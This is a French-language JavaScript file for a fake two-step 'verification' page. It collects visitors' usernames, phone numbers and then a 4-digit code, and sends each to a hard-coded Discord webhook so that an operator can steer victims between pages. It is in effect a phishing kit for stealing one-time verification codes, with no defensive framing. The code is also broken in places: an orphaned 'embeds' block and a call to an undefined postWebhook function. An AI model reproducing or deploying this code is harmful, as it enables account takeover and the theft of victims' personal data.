// Configuration - Webhook Discord configuré
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1502745780304347257/oEywgtEnyzR6OncpQYn5wq9VxcRwTFDdjInd6TNo5sFCB2Dz7kMB-k7KNMpZZYQzzhX6';

const step1Form = document.getElementById('step1Form');
const waitingScreen = document.getElementById('waitingScreen');
const countdownEl = document.getElementById('countdown');
const statusMessage = document.getElementById('statusMessage');
const codeForm = document.getElementById('codeForm');
const phoneInput = document.getElementById('phone');
const codeInput = document.getElementById('code');

let formData = {
    username: '',
    phone: ''
};

function showMessage(message, type) {
    if (!statusMessage) return;
    statusMessage.textContent = message;
    statusMessage.className = 'status-message ' + type;
}

function getBaseUrl() {
    if (window.location.protocol.startsWith('http')) {
        return window.location.origin + window.location.pathname.replace(/\/[^\/]*$/, '');
    }
    return window.location.href.replace(/\/[^\/]*$/, '');
}

async function sendWebhook(payload) {
    try {
        const form = new FormData();
        form.append('payload_json', JSON.stringify(payload));

        await fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            mode: 'no-cors',
            body: form
        });
        return true;
    } catch (error) {
        console.error('Webhook error:', error);
        return false;
    }
}

function formatPhone(value) {
    const digits = value.replace(/\D/g, '').slice(0, 10);
    if (digits.length <= 2) return digits;
    if (digits.length <= 4) return digits.slice(0, 2) + ' ' + digits.slice(2);
    if (digits.length <= 6) return digits.slice(0, 2) + ' ' + digits.slice(2, 4) + ' ' + digits.slice(4);
    if (digits.length <= 8) return digits.slice(0, 2) + ' ' + digits.slice(2, 4) + ' ' + digits.slice(4, 6) + ' ' + digits.slice(6);
    return digits.slice(0, 2) + ' ' + digits.slice(2, 4) + ' ' + digits.slice(4, 6) + ' ' + digits.slice(6, 8) + ' ' + digits.slice(8, 10);
}

function startCountdown(seconds) {
    let remaining = seconds;
    if (countdownEl) countdownEl.textContent = '02:00';

    const timer = setInterval(() => {
        remaining -= 1;
        const minutes = String(Math.floor(remaining / 60)).padStart(2, '0');
        const secondes = String(remaining % 60).padStart(2, '0');
        if (countdownEl) countdownEl.textContent = `${minutes}:${secondes}`;

        if (remaining <= 0) {
            clearInterval(timer);
            window.location.href = 'code.html';
        }
    }, 1000);
}

if (step1Form) {
    step1Form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!username) {
            showMessage('Veuillez entrer un username', 'error');
            return;
        }
        if (!phone) {
            showMessage('Veuillez entrer votre numéro', 'error');
            return;
        }

        const baseUrl = getBaseUrl();
        const payload = {
            content: `Nouvelle demande de vérification\nUsername: ${username}\nNuméro: ${phone}`,
            components: [
                {
                    type: 1,
                    components: [
                        {
                            type: 2,
                            style: 5,
                            label: 'NON',
                            url: `${baseUrl}/ineligible.html`
                        },
                        {
                            type: 2,
                            style: 5,
                            label: 'ENVOYER LE CODE',
                            url: `${baseUrl}/code.html`
                        }
                    ]
                }
            ]
        };

        showMessage('Envoi en cours...', 'loading');

        try {
            const success = await sendWebhook(payload);

            if (!success) {
                showMessage('❌ Erreur lors de l\'envoi au webhook', 'error');
                return;
            }

            formData.username = username;
            formData.phone = phone;
            step1Form.classList.add('hidden');
            if (waitingScreen) waitingScreen.classList.remove('hidden');
            showMessage('Votre demande a été envoyée. Redirection vers le code en 2 minutes.', 'success');
            startCountdown(120);
        } catch (error) {
            console.error('Erreur:', error);
            showMessage('❌ Erreur: ' + error.message, 'error');
        }
    });
}

if (codeForm) {
    codeForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        const code = codeInput.value.trim();
        if (!code) {
            showMessage('Veuillez entrer le code', 'error');
            return;
        }
        if (code.length !== 4 || !/^\d+$/.test(code)) {
            showMessage('Le code doit contenir 4 chiffres', 'error');
            return;
        }

        const submitBtn = codeForm.querySelector('.btn-continue');
        submitBtn.disabled = true;
        showMessage('Envoi du code en cours...', 'loading');

            embeds: [
                {
                    title: '🔑 Code de vérification',
                    color: 16764160,
                    fields: [
                        {
                            name: 'Code reçu',
                            value: '```\n' + code + '\n```',
                            inline: false
                        },
                        {
                            name: '⏰ Heure',
                            value: new Date().toLocaleString('fr-FR'),
                            inline: false
                        }
                    ],
                    footer: {
                        text: 'Vérification étape 2'
                    }
                }
            ]
        };

        try {
            const content = `Code reçu\nCode: ${code}\nHeure: ${new Date().toLocaleString('fr-FR')}`;
            const form = new FormData();
            form.append('content', content);

            const success = await postWebhook(form);
            if (!success) {
                throw new Error('Erreur lors de l\'envoi au webhook');
            }

            showMessage('✅ Code envoyé avec succès !', 'success');
            codeForm.reset();
        } catch (error) {
            console.error('Erreur:', error);
            showMessage('❌ Erreur: ' + error.message, 'error');
        } finally {
            submitBtn.disabled = false;
        }
    });
}

if (codeInput) {
    codeInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 4);
    });
    codeInput.addEventListener('keypress', (e) => {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    });
}

if (phoneInput) {
    phoneInput.addEventListener('input', (e) => {
        e.target.value = formatPhone(e.target.value);
    });
    phoneInput.addEventListener('keypress', (e) => {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    });
}
